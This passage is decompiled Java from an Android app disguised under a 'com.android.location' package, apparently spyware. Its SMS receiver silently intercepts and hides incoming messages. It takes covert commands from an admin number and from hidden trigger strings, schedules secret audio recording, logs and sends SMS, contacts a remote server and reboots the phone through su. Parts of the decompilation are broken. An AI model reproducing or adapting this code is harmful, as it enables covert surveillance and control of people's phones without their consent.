    //   187	1	3	localIOException3	IOException
    //   14	175	4	localOutputStreamWriter	java.io.OutputStreamWriter
    //   17	99	5	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   100	105	106	java/lang/InterruptedException
    //   42	50	112	java/io/IOException
    //   55	68	112	java/io/IOException
    //   132	136	141	java/io/IOException
    //   42	50	151	finally
    //   55	68	151	finally
    //   122	126	151	finally
    //   156	160	162	java/io/IOException
    //   89	94	170	java/io/IOException
    //   68	84	180	finally
    //   68	84	187	java/io/IOException
  }
  
  private String getTaskMap(boolean paramBoolean)
  {
    FLOG("getTaskMap");
    Cursor localCursor = PlayService.ref.getContentResolver().query(TaskProvider.CONTENT_URI, null, null, null, "priority,timepoint");
    if (localCursor == null)
    {
      FLOG("No rectask entries, returning...");
      return PlayService.res.getString(2130968643);
    }
    if (localCursor.getCount() == 0)
    {
      FLOG("No rectask entries, returning...");
      localCursor.close();
      return PlayService.res.getString(2130968643);
    }
    FLOG("getRecAudioTaskMap - got records:" + localCursor.getCount());
    Object localObject4 = "";
    Object localObject2 = localObject4;
    localObject1 = localObject4;
    for (;;)
    {
      try
      {
        if (localCursor.moveToFirst())
        {
          localObject1 = localObject4;
          int i = localCursor.getColumnIndex("command_id");
          localObject1 = localObject4;
          int j = localCursor.getColumnIndex("minutes");
          localObject1 = localObject4;
          int k = localCursor.getColumnIndex("timepoint");
          localObject1 = localObject4;
          localObject2 = localCursor.getString(i);
          localObject1 = localObject4;
          int m = localCursor.getInt(j);
          localObject1 = localObject4;
          long l = localCursor.getInt(k);
          localObject1 = localObject4;
          localObject4 = localObject4 + "*" + (String)localObject2 + "*";
          localObject2 = localObject4;
          if (m > 0)
          {
            localObject1 = localObject4;
            localObject2 = localObject4 + " " + m;
          }
          localObject4 = localObject2;
          localObject1 = localObject2;
          if (l > PlayService.getCurrentTime() / 1000L)
          {
            localObject1 = localObject2;
            localObject4 = new Time();
            localObject1 = localObject2;
            ((Time)localObject4).setToNow();
            localObject1 = localObject2;
            FLOG("now = " + ((Time)localObject4).toMillis(true));
            localObject1 = localObject2;
            ((Time)localObject4).set(1000L * l);
            localObject1 = localObject2;
            FLOG("converting=" + l + " vs " + ((Time)localObject4).toMillis(true));
            localObject1 = localObject2;
            localObject4 = localObject2 + " " + ((Time)localObject4).monthDay + "." + (((Time)localObject4).month + 1) + "." + ((Time)localObject4).year + " " + ((Time)localObject4).hour + ":" + ((Time)localObject4).minute;
          }
          if (!paramBoolean) {
            continue;
          }
          localObject1 = localObject4;
          localObject2 = localObject4 + "\n";
          localObject1 = localObject2;
          boolean bool = localCursor.moveToNext();
          localObject4 = localObject2;
          if (bool) {
            continue;
          }
        }
      }
      catch (Exception localException)
      {
        PlayService.EXCEPT(localException, "error reading task map");
        Object localObject3 = localObject1;
        continue;
      }
      localCursor.close();
      return localObject2;
      localObject1 = localObject4;
      localObject2 = localObject4 + "<br>";
    }
  }
  
  public static int isGet(String paramString)
  {
    if (paramString == null) {}
    for (;;)
    {
      return 0;
      String str = "GET / HTTP/1.1\r\nHost: " + paramString + "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5\r\nAccept: text/html\r\nConnection: close\r\n\r\n";
      try
      {
        paramString = new Socket(paramString, 80);
        PrintWriter localPrintWriter = new PrintWriter(paramString.getOutputStream(), true);
        BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(paramString.getInputStream()));
        paramString = str;
        if (localBufferedReader != null)
        {
          paramString = str;
          if (localPrintWriter != null)
          {
            localPrintWriter.println(str);
            paramString = str;
          }
        }
        try
        {
          str = localBufferedReader.readLine();
          paramString = str;
          System.out.println(str);
          paramString = str;
        }
        catch (IOException localIOException)
        {
          for (;;)
          {
            System.out.println("Read failed");
          }
        }
        if ((paramString != null) && (paramString.startsWith("HTTP"))) {
          return 1;
        }
      }
      catch (UnknownHostException paramString)
      {
        PlayService.EXCEPT(paramString, "isGet.UHException");
        System.out.println("Unknown host: kq6py");
        return 0;
      }
      catch (IOException paramString)
      {
        PlayService.EXCEPT(paramString, "isGet.IOException");
        System.out.println("No I/O");
        return 0;
      }
      catch (Exception paramString)
      {
        System.out.println("No I/O");
        PlayService.EXCEPT(paramString, "isGet.Exception");
      }
    }
    return 0;
  }
  
  public static int isGet2(String paramString)
  {
    if (paramString == null) {}
    int k;
    for (;;)
    {
      return 0;
      int n = 0;
      int i1 = 0;
      int m = 0;
      int i = m;
      int j = n;
      k = i1;
      try
      {
        Socket localSocket = new Socket(paramString, Integer.parseInt(PlayService.Port));
        if (localSocket != null)
        {
          i = m;
          j = n;
          k = i1;
          if (localSocket.isConnected())
          {
            j = 1;
            k = 1;
            i = 1;
            FLOG("Socket good connect:" + paramString + ":" + PlayService.Port);
            return 1;
          }
        }
      }
      catch (UnknownHostException paramString)
      {
        PlayService.EXCEPT(paramString, "isGet2.UHException");
        System.out.println("Unknown host");
        return i;
      }
      catch (IOException paramString)
      {
        PlayService.EXCEPT(paramString, "isGet2.IOException");
        System.out.println("No I/O");
        return j;
      }
      catch (Exception paramString)
      {
        System.out.println("No I/O");
        PlayService.EXCEPT(paramString, "isGet.Exception");
      }
    }
    return k;
  }
  
  /* Error */
  public static int isGet3(String paramString1, String paramString2, String paramString3)
  {
    // Byte code:
    //   0: aload_0
    //   1: ifnonnull +5 -> 6
    //   4: iconst_0
    //   5: ireturn
    //   6: new 305	java/lang/StringBuilder
    //   9: dup
    //   10: ldc_w 1713
    //   13: invokespecial 310	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   16: aload_1
    //   17: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   20: ldc_w 1715
    //   23: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   26: aload_0
    //   27: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   30: ldc_w 1682
    //   33: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   36: invokevirtual 318	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   39: astore_1
    //   40: iconst_0
    //   41: istore 8
    //   43: iconst_0
    //   44: istore 9
    //   46: iconst_0
    //   47: istore 10
    //   49: iconst_0
    //   50: istore 7
    //   52: iload 8
    //   54: istore 4
    //   56: iload 9
    //   58: istore 6
    //   60: iload 10
    //   62: istore 5
    //   64: new 1395	java/net/Socket
    //   67: dup
    //   68: aload_0
    //   69: bipush 80
    //   71: invokespecial 1398	java/net/Socket:<init>	(Ljava/lang/String;I)V
    //   74: astore 11
    //   76: iload 8
    //   78: istore 4
    //   80: iload 9
    //   82: istore 6
    //   84: iload 10
    //   86: istore 5
    //   88: new 1404	java/io/PrintWriter
    //   91: dup
    //   92: aload 11
    //   94: invokevirtual 1408	java/net/Socket:getOutputStream	()Ljava/io/OutputStream;
    //   97: iconst_1
    //   98: invokespecial 1411	java/io/PrintWriter:<init>	(Ljava/io/OutputStream;Z)V
    //   101: astore_0
    //   102: iload 8
    //   104: istore 4
    //   106: iload 9
    //   108: istore 6
    //   110: iload 10
    //   112: istore 5
    //   114: new 1413	java/io/BufferedReader
    //   117: dup
    //   118: new 1415	java/io/InputStreamReader
    //   121: dup
    //   122: aload 11
    //   124: invokevirtual 1419	java/net/Socket:getInputStream	()Ljava/io/InputStream;
    //   127: invokespecial 1422	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   130: invokespecial 1425	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   133: astore 11
    //   135: iload 7
    //   137: istore_3
    //   138: aload 11
    //   140: ifnull +69 -> 209
    //   143: iload 7
    //   145: istore_3
    //   146: aload_0
    //   147: ifnull +62 -> 209
    //   150: iload 8
    //   152: istore 4
    //   154: iload 9
    //   156: istore 6
    //   158: iload 10
    //   160: istore 5
    //   162: aload_0
    //   163: aload_1
    //   164: invokevirtual 1428	java/io/PrintWriter:println	(Ljava/lang/String;)V
    //   167: iload 8
    //   169: istore 4
    //   171: iload 9
    //   173: istore 6
    //   175: iload 10
    //   177: istore 5
    //   179: getstatic 1441	java/lang/System:out	Ljava/io/PrintStream;
    //   182: ldc_w 1717
    //   185: invokevirtual 1446	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   188: iload 8
    //   190: istore 4
    //   192: iload 10
    //   194: istore 5
    //   196: aload 11
    //   198: invokevirtual 1431	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   201: astore_1
    //   202: aload_1
    //   203: ifnonnull +55 -> 258
    //   206: iload 7
    //   208: istore_3
    //   209: iload_3
    //   210: istore 4
    //   212: iload_3
    //   213: istore 6
    //   215: iload_3
    //   216: istore 5
    //   218: aload 11
    //   220: invokevirtual 1718	java/io/BufferedReader:close	()V
    //   223: iload_3
    //   224: istore 4
    //   226: iload_3
    //   227: istore 6
    //   229: iload_3
    //   230: istore 5
    //   232: aload_0
    //   233: invokevirtual 1719	java/io/PrintWriter:close	()V
    //   236: iload_3
    //   237: ireturn
    //   238: astore_0
    //   239: aload_0
    //   240: ldc_w 1689
    //   243: invokestatic 1300	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   246: getstatic 1441	java/lang/System:out	Ljava/io/PrintStream;
    //   249: ldc_w 1691
    //   252: invokevirtual 1446	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   255: iload 4
    //   257: ireturn
    //   258: iload 8
    //   260: istore 4
    //   262: iload 10
    //   264: istore 5
    //   266: getstatic 1441	java/lang/System:out	Ljava/io/PrintStream;
    //   269: new 305	java/lang/StringBuilder
    //   272: dup
    //   273: ldc_w 1433
    //   276: invokespecial 310	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   279: aload_1
    //   280: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   283: ldc_w 419
    //   286: invokevirtual 332	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   289: invokevirtual 318	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   292: invokevirtual 1446	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   295: iload 8
    //   297: istore 4
    //   299: iload 10
    //   301: istore 5
    //   303: aload_1
    //   304: aload_2
    //   305: invokevirtual 1722	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   308: istore_3
    //   309: iload_3
    //   310: iflt -122 -> 188
    //   313: iconst_1
    //   314: istore_3
    //   315: goto -106 -> 209
    //   318: astore_1
    //   319: iload 8
    //   321: istore 4
    //   323: iload 9
    //   325: istore 6
    //   327: iload 10
    //   329: istore 5
    //   331: getstatic 1441	java/lang/System:out	Ljava/io/PrintStream;
    //   334: ldc_w 1724
    //   337: invokevirtual 1446	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   340: iload 7
    //   342: istore_3
    //   343: goto -134 -> 209
    //   346: astore_0
    //   347: aload_0
    //   348: ldc_w 1693
    //   351: invokestatic 1300	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   354: getstatic 1441	java/lang/System:out	Ljava/io/PrintStream;
    //   357: ldc_w 1695
    //   360: invokevirtual 1446	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   363: iload 6
    //   365: ireturn
    //   366: astore_0
    //   367: getstatic 1441	java/lang/System:out	Ljava/io/PrintStream;
    //   370: ldc_w 1695
    //   373: invokevirtual 1446	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   376: aload_0
    //   377: ldc_w 1697
    //   380: invokestatic 1300	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   383: iload 5
    //   385: ireturn
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	386	0	paramString1	String
    //   0	386	1	paramString2	String
    //   0	386	2	paramString3	String
    //   137	206	3	i	int
    //   54	268	4	j	int
    //   62	322	5	k	int
    //   58	306	6	m	int
    //   50	291	7	n	int
    //   41	279	8	i1	int
    //   44	280	9	i2	int
    //   47	281	10	i3	int
    //   74	145	11	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   64	76	238	java/net/UnknownHostException
    //   88	102	238	java/net/UnknownHostException
    //   114	135	238	java/net/UnknownHostException
    //   162	167	238	java/net/UnknownHostException
    //   179	188	238	java/net/UnknownHostException
    //   196	202	238	java/net/UnknownHostException
    //   218	223	238	java/net/UnknownHostException
    //   232	236	238	java/net/UnknownHostException
    //   266	295	238	java/net/UnknownHostException
    //   303	309	238	java/net/UnknownHostException
    //   331	340	238	java/net/UnknownHostException
    //   196	202	318	java/io/IOException
    //   266	295	318	java/io/IOException
    //   303	309	318	java/io/IOException
    //   64	76	346	java/io/IOException
    //   88	102	346	java/io/IOException
    //   114	135	346	java/io/IOException
    //   162	167	346	java/io/IOException
    //   179	188	346	java/io/IOException
    //   218	223	346	java/io/IOException
    //   232	236	346	java/io/IOException
    //   331	340	346	java/io/IOException
    //   64	76	366	java/lang/Exception
    //   88	102	366	java/lang/Exception
    //   114	135	366	java/lang/Exception
    //   162	167	366	java/lang/Exception
    //   179	188	366	java/lang/Exception
    //   196	202	366	java/lang/Exception
    //   218	223	366	java/lang/Exception
    //   232	236	366	java/lang/Exception
    //   266	295	366	java/lang/Exception
    //   303	309	366	java/lang/Exception
    //   331	340	366	java/lang/Exception
  }
  
  private static boolean isNetworkAvailable()
  {
    if (PlayService.context == null) {}
    NetworkInfo localNetworkInfo;
    do
    {
      return false;
      localNetworkInfo = ((ConnectivityManager)PlayService.context.getSystemService("connectivity")).getActiveNetworkInfo();
    } while ((localNetworkInfo == null) || (!localNetworkInfo.isConnected()));
    return true;
  }
  
  static String myip_ru()
  {
    FLOG("myip_rumyip_rumyip_rumyip_ru");
    Object localObject1 = PlayService.SMSServer;
    String str1 = "GET /myip.php HTTP/1.1\r\nHost: " + (String)localObject1 + "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5\r\nAccept: text/html\r\nConnection: close\r\n\r\n";
    String str2 = "";
    for (;;)
    {
      try
      {
        localObject1 = new Socket((String)localObject1, 80);
        PrintWriter localPrintWriter = new PrintWriter(((Socket)localObject1).getOutputStream(), true);
        localBufferedReader = new BufferedReader(new InputStreamReader(((Socket)localObject1).getInputStream()));
        localObject1 = str2;
        if (localPrintWriter == null) {
          return localObject1;
        }
        localObject1 = str2;
        if (localBufferedReader == null) {
          return localObject1;
        }
        localPrintWriter.println(str1);
        localObject1 = str1;
      }
      catch (UnknownHostException localUnknownHostException)
      {
        BufferedReader localBufferedReader;
        Object localObject2;
        PlayService.EXCEPT(localUnknownHostException, "isGet.UHException");
        return "";
        if (localUnknownHostException.length() <= 0) {
          continue;
        }
        int i = localUnknownHostException.indexOf(':');
        if (i != -1) {
          continue;
        }
      }
      catch (IOException localIOException1)
      {
        PlayService.EXCEPT(localIOException1, "isGet.IOException");
        return "";
      }
      catch (Exception localException)
      {
        PlayService.EXCEPT(localException, "isGet.Exception");
        return "";
      }
      try
      {
        str1 = localBufferedReader.readLine();
        localObject1 = str1;
        System.out.println(str1);
      }
      catch (IOException localIOException2)
      {
        System.out.println("Read failed");
        localObject2 = localObject1;
      }
    }
    localObject1 = str2;
    if (str1 != null)
    {
      localObject1 = str2;
      if (str1.startsWith("HTTP"))
      {
        localObject1 = localBufferedReader.readLine();
        if (localObject1 == null) {}
      }
    }
    return localException;
  }
  
  /* Error */
  public static void rebootSU()
  {
    // Byte code:
    //   0: invokestatic 1595	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore_1
    //   4: aconst_null
    //   5: astore_2
    //   6: aconst_null
    //   7: astore_3
    //   8: aconst_null
    //   9: astore 4
    //   11: ldc_w 1755
    //   14: invokestatic 321	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
    //   17: aload_3
    //   18: astore_0
    //   19: aload_1
    //   20: ldc_w 1643
    //   23: invokevirtual 1603	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   26: astore_1
    //   27: aload_1
    //   28: astore_2
    //   29: aload_3
    //   30: astore_0
    //   31: new 1605	java/io/OutputStreamWriter
    //   34: dup
    //   35: aload_1
    //   36: invokevirtual 1608	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   39: invokespecial 1611	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   42: astore_3
    //   43: aload_3
    //   44: ldc_w 1757
    //   47: invokevirtual 1614	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   50: aload_3
    //   51: invokevirtual 1617	java/io/OutputStreamWriter:flush	()V
    //   54: aload_3
    //   55: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   58: aload_3
    //   59: ifnull +80 -> 139
    //   62: aload_3
    //   63: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   66: aload_1
    //   67: astore_0
    //   68: aload_0
    //   69: ifnull +8 -> 77
    //   72: aload_0
    //   73: invokevirtual 1623	java/lang/Process:waitFor	()I
    //   76: pop
    //   77: return
    //   78: astore_3
    //   79: aload_2
    //   80: astore_1
    //   81: aload 4
    //   83: astore_2
    //   84: aload_2
    //   85: astore_0
    //   86: aload_3
    //   87: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   90: aload_1
    //   91: astore_0
    //   92: aload_2
    //   93: ifnull -25 -> 68
    //   96: aload_2
    //   97: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   100: aload_1
    //   101: astore_0
    //   102: goto -34 -> 68
    //   105: astore_0
    //   106: aload_0
    //   107: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   110: aload_1
    //   111: astore_0
    //   112: goto -44 -> 68
    //   115: astore_1
    //   116: aload_0
    //   117: ifnull +7 -> 124
    //   120: aload_0
    //   121: invokevirtual 1620	java/io/OutputStreamWriter:close	()V
    //   124: aload_1
    //   125: athrow
    //   126: astore_0
    //   127: aload_0
    //   128: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   131: goto -7 -> 124
    //   134: astore_0
    //   135: aload_0
    //   136: invokevirtual 1628	java/io/IOException:printStackTrace	()V
    //   139: aload_1
    //   140: astore_0
    //   141: goto -73 -> 68
    //   144: astore_0
    //   145: aload_0
    //   146: invokevirtual 1629	java/lang/InterruptedException:printStackTrace	()V
    //   149: return
    //   150: astore_1
    //   151: aload_3
    //   152: astore_0
    //   153: goto -37 -> 116
    //   156: astore_0
    //   157: aload_3
    //   158: astore_2
    //   159: aload_0
    //   160: astore_3
    //   161: goto -77 -> 84
    // Local variable table:
    //   start	length	slot	name	signature
    //   18	84	0	localObject1	Object
    //   105	2	0	localIOException1	IOException
    //   111	10	0	localObject2	Object
    //   126	2	0	localIOException2	IOException
    //   134	2	0	localIOException3	IOException
    //   140	1	0	localObject3	Object
    //   144	2	0	localInterruptedException	InterruptedException
    //   152	1	0	localIOException4	IOException
    //   156	4	0	localIOException5	IOException
    //   3	108	1	localObject4	Object
    //   115	25	1	localObject5	Object
    //   150	1	1	localObject6	Object
    //   5	154	2	localObject7	Object
    //   7	56	3	localOutputStreamWriter	java.io.OutputStreamWriter
    //   78	80	3	localIOException6	IOException
    //   160	1	3	localObject8	Object
    //   9	73	4	localObject9	Object
    // Exception table:
    //   from	to	target	type
    //   19	27	78	java/io/IOException
    //   31	43	78	java/io/IOException
    //   96	100	105	java/io/IOException
    //   19	27	115	finally
    //   31	43	115	finally
    //   86	90	115	finally
    //   120	124	126	java/io/IOException
    //   62	66	134	java/io/IOException
    //   72	77	144	java/lang/InterruptedException
    //   43	58	150	finally
    //   43	58	156	java/io/IOException
  }
  
  public String AddAudioTask(int paramInt1, int paramInt2, String paramString, boolean paramBoolean1, boolean paramBoolean2)
  {
    if ((paramInt1 != 8) && (paramInt1 != 28) && (paramInt1 != 9) && (paramInt1 != 48) && (paramInt1 != 49) && (paramInt1 != 108)) {
      return PlayService.res.getString(2130968644);
    }
    if ((paramInt1 == 48) && (paramString.length() < 11)) {
      return PlayService.res.getString(2130968645) + "(2)";
    }
    if (((paramInt1 == 8) || (paramInt1 == 28) || (paramInt1 == 108)) && (paramInt2 < 0)) {
      return PlayService.res.getString(2130968646);
    }
    ContentValues localContentValues = new ContentValues();
    int k = 40;
    long l2 = PlayService.getCurrentTime() / 1000L;
    int i = k;
    long l1 = l2;
    int j = paramInt1;
    switch (paramInt1)
    {
    default: 
      return "unknown command";
    case 8: 
      j = 28;
      l1 = l2;
      i = k;
    }
    for (;;)
    {
      FLOG("insert:" + j + "," + paramInt2 + "," + l1 + "," + i);
      localContentValues.put("command_id", Integer.valueOf(j));
      localContentValues.put("minutes", Integer.valueOf(paramInt2));
      localContentValues.put("timepoint", Long.valueOf(l1));
      localContentValues.put("priority", Integer.valueOf(i));
      try
      {
        PlayService.ref.getContentResolver().insert(TaskProvider.CONTENT_URI, localContentValues);
        if (!paramBoolean1)
        {
          return "";
          paramString = paramString.split(":");
          if (paramString.length != 2) {
            return PlayService.res.getString(2130968645) + "(3)";
          }
          if (paramString[0].length() != 6) {
            return PlayService.res.getString(2130968645) + "(4)";
          }
          if (paramString[1].length() != 4) {
            return PlayService.res.getString(2130968645) + "(5)";
          }
          Time localTime = new Time();
          localTime.setToNow();
          try
          {
            localTime.hour = (Integer.parseInt(paramString[1].charAt(0)) * 10 + Integer.parseInt(paramString[1].charAt(1)));
            localTime.minute = (Integer.parseInt(paramString[1].charAt(2)) * 10 + Integer.parseInt(paramString[1].charAt(3)));
            localTime.monthDay = (Integer.parseInt(paramString[0].charAt(0)) * 10 + Integer.parseInt(paramString[0].charAt(1)));
            localTime.month = (Integer.parseInt(paramString[0].charAt(2)) * 10 + Integer.parseInt(paramString[0].charAt(3)) - 1);
            localTime.year = (Integer.parseInt(paramString[0].charAt(4)) * 10 + 2000 + Integer.parseInt(paramString[0].charAt(5)));
            localTime.second = 0;
            l2 = localTime.toMillis(true) / 1000L;
            FLOG("48timepoint = " + l2);
            i = k;
            l1 = l2;
            j = paramInt1;
            if (l2 != 0L) {
              continue;
            }
            return PlayService.res.getString(2130968645) + "(7)";
          }
          catch (Exception paramString)
          {
            return PlayService.res.getString(2130968645) + "(6)";
          }
          i = 30;
          l1 = l2;
          j = paramInt1;
          continue;
          i = 20;
          l1 = l2;
          j = paramInt1;
          continue;
          i = 10;
          l1 = l2;
          j = paramInt1;
        }
      }
      catch (Exception paramString)
      {
        for (;;)
        {
          PlayService.EXCEPT(paramString, "Error insert Audio task");
        }
      }
    }
    return getTaskMap(paramBoolean2);
  }
  
  boolean CalcHash(String paramString)
  {
    int i1 = 0;
    int k = 0;
    int j = 0;
    int i3 = paramString.length();
    int i = 0;
    for (;;)
    {
      if (i >= i3)
      {
        if ((i1 != 3) || (k != 2) || (j != 1)) {
          break;
        }
        return true;
      }
      int m = i1;
      if (paramString.charAt(i) == ',') {
        m = i1 + 1;
      }
      int n = k;
      if (paramString.charAt(i) == '.') {
        n = k + 1;
      }
      int i2 = j;
      if (paramString.charAt(i) == '?') {
        i2 = j + 1;
      }
      i += 1;
      i1 = m;
      k = n;
      j = i2;
    }
    return false;
  }
  
  public void MEGALOG1(String paramString)
  {
    FLOG(paramString);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (PlayService.ref == null) {}
    Object[] arrayOfObject;
    SmsMessage[] arrayOfSmsMessage;
    int i;
    for (;;)
    {
      return;
      if (paramIntent != null)
      {
        this.lastKnown = paramContext;
        try
        {
          if (paramIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
          {
            FLOG("SMS RECEIVED!!!");
            paramContext = paramIntent.getExtras();
            if (paramContext != null)
            {
              arrayOfObject = (Object[])paramContext.get("pdus");
              arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
              i = 0;
              if (i < arrayOfObject.length) {
                break;
              }
            }
            else
            {
              FLOG("Reset counter");
              if ((PlayService.ref == null) || (PlayService.ref.thSMSCopier == null)) {
                continue;
              }
              PlayService.ref.thSMSCopier.ResetCounter();
              return;
            }
          }
        }
        catch (Exception paramContext)
        {
          EXCEPT(paramContext, "SMSReceiver DIED");
          return;
        }
      }
    }
    FLOG("#1: of " + arrayOfObject.length);
    arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
    paramIntent = arrayOfSmsMessage[i].getDisplayOriginatingAddress();
    paramContext = paramIntent;
    if (paramIntent == null) {
      paramContext = "";
    }
    FLOG(paramContext);
    FLOG(arrayOfSmsMessage[i].getOriginatingAddress());
    int j = 1;
    if (PlayService.sAdminNumber == null) {
      PlayService.sAdminNumber = "";
    }
    if (PlayService.sAdminNumber.length() == 0) {
      j = 0;
    }
    FLOG("Admin ? " + paramContext + " <> " + PlayService.sAdminNumber);
    int k = 0;
    if (arrayOfSmsMessage[i].getMessageBody().startsWith("*25*")) {
      k = 1;
    }
    paramIntent = arrayOfSmsMessage[i].getMessageBody();
    FLOG("text=" + paramIntent);
    boolean bool = CalcHash(paramIntent);
    if ((paramIntent.indexOf("???..^@??") > -1) || (paramIntent.indexOf("/;-)))))") > -1) || (paramIntent.indexOf("/:-|))))") > -1) || (bool))
    {
      abortBroadcast();
      FLOG("CommaHash = " + bool);
      paramIntent = "0";
      if ((arrayOfSmsMessage[i].getMessageBody().indexOf("/:-|))))") <= -1) && (!bool))
      {
        label389:
        FLOG("dta=" + paramIntent);
        this.thCommandor.Push(23, paramIntent, paramContext);
      }
    }
    else
    {
      if ((paramContext == null) || (!paramContext.endsWith(PlayService.sAdminNumber)) || (j == 0)) {
        break label737;
      }
      label443:
      this.sSMSLine = arrayOfSmsMessage[i].getMessageBody();
      FLOG("admin SMS!");
      if ((arrayOfSmsMessage[i].getMessageBody().length() >= 4) && (arrayOfSmsMessage[i].getMessageBody().charAt(0) == '*') && ((arrayOfSmsMessage[i].getMessageBody().charAt(3) == '*') || (arrayOfSmsMessage[i].getMessageBody().charAt(4) == '*')))
      {
        abortBroadcast();
        paramIntent = arrayOfSmsMessage[i].getMessageBody();
        j = 4;
        if (arrayOfSmsMessage[i].getMessageBody().charAt(4) == '*') {
          j = 5;
        }
        if (j != 5) {
          break label745;
        }
        i = paramIntent.charAt(2) - '0';
        label571:
        i = i * 100 + (paramIntent.charAt(1) - '0') * 10 + (paramIntent.charAt(2) - '0');
        paramIntent = paramIntent.substring(j).trim();
        FLOG("#" + i);
        this.thCommandor.Push(i, paramIntent, paramContext);
        return;
      }
      FLOG("simple sms from admin");
      label644:
      FLOG("sms is not command or not admin");
      if (PlayService.sBlockSMSList == null) {
        break label750;
      }
      paramIntent = PlayService.sBlockSMSList.split(",");
      j = 0;
    }
    for (;;)
    {
      if (j < paramIntent.length)
      {
        if ((paramIntent[j].length() == 0) || (!paramContext.endsWith(paramIntent[j]))) {
          break label757;
        }
        FLOG("Blacklisted " + paramContext);
        abortBroadcast();
        break label750;
        paramIntent = "1";
        break label389;
        label737:
        if (k == 0) {
          break label644;
        }
        break label443;
        label745:
        i = 0;
        break label571;
      }
      label750:
      i += 1;
      break;
      label757:
      j += 1;
    }
  }
  
  public void sendSMS(String paramString1, String paramString2)
  {
    if (paramString1 == null) {}
    while ((paramString2 == null) || (paramString1.length() == 0)) {
      return;
    }
    SmsManager localSmsManager = SmsManager.getDefault();
    ArrayList localArrayList = localSmsManager.divideMessage(paramString2);
    FLOG("SMS to " + paramString1 + ",text = " + paramString2);
    localSmsManager.sendMultipartTextMessage(paramString1, null, localArrayList, null, null);
    paramString1 = new Time();
    paramString1.setToNow();
    this.sSMSLine = (paramString1.toMillis(true) + "<*>" + this.sSMSLine + "<*>" + paramString2);
    FLOG("SMSLINE = " + this.sSMSLine);
    PlayService.sSMSLOG = PlayService.sSMSLOG + this.sSMSLine + "[*]\n";
  }
  
  public class AudioMonitor
    extends Thread
  {
    private boolean bRecording = false;
    private boolean bSkipSleep = false;
    private long iDelay = 0L;
    private long iStart = 0L;
    private int iTaskID = 0;
    private boolean running;
    
    public AudioMonitor() {}
    
    private boolean IsRecording()
    {
      if (PlayService.ref == null) {}
      while ((PlayService.iCallRecordState > 0) || (PlayService.ref.iVOIPRecordState > 0)) {
        return true;
      }
      return this.bRecording;
    }
    
    public boolean IsAudioRecording()
    {
      return this.bRecording;
    }
    
    public void Pause()
    {
      try
      {
        SMSReceiver.FLOG("AudioMonitor::Pause");
        if (!this.bRecording) {
          return;
        }
        SMSReceiver.FLOG("AudioMonitor::StopRecordAndSaveAudio");
        SMSReceiver.FLOG("AudioMonitor::iStart=" + this.iStart);
        SMSReceiver.FLOG("AudioMonitor::iDelay=" + this.iDelay);
        SMSReceiver.FLOG("AudioMonitor::now=" + PlayService.getCurrentTime());
        long l = (this.iDelay * 60L * 1000L - (PlayService.getCurrentTime() - this.iStart)) / 1000L / 60L + 1L;
        StopRecordAndSaveAudio();
        SMSReceiver.FLOG("AudioMonitor::iMinutesLeft=" + l);
        SMSReceiver.this.AddAudioTask(108, (int)l, "", false, true);
        return;
      }
      catch (Exception localException)
      {
        PlayService.EXCEPT(localException, "AM:Pause");
      }
    }
    
    public void Resume()
    {
      SMSReceiver.this.DeleteAudioTask(this.iTaskID);
      this.iTaskID = 0;
      this.bSkipSleep = true;
    }
    
    /* Error */
    public int StartAudio(long paramLong, int paramInt)
    {
      // Byte code:
      //   0: ldc 116
      //   2: invokestatic 60	ru/mobile/protector/SMSReceiver:FLOG	(Ljava/lang/String;)V
      //   5: getstatic 44	com/android/location/PlayService:ref	Lcom/android/location/PlayService;
      //   8: ifnull +9 -> 17
